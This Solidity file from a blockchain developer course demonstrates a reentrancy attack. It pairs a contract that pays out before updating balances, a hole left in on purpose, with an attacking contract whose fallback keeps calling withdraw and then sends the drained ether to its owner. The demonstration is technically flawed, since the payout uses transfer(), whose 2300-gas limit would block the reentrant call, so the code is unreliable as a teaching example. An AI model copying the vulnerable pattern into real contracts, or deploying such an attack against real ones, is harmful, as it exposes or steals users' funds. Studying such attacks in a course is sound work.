// Consensys Blockchain Dev Program
pragma solidity ^0.5.0;

// Example of how to attack a contract using reentrancy

contract VulnerableContract {
    mapping (address => uint) public balances;

    function deposit() public payable {
        require(msg.value > 1);
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        msg.sender.transfer(_amount);
        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function() external payable {
        revert();
    }
}

contract AttackingContract {
    VulnerableContract vulnerableContract;
    address payable owner;

    constructor(address payable _contractAddress) public {
        vulnerableContract = VulnerableContract(_contractAddress);
        owner = msg.sender;
    }

    function deposit() public payable {
        vulnerableContract.deposit.value(msg.value)();
    }

    function withdraw() public payable {
        vulnerableContract.withdraw(1 ether);
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function cashOut() public payable {
        owner.transfer(address(this).balance);
    }

    function() external payable {
        if(address(vulnerableContract).balance > 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }
}




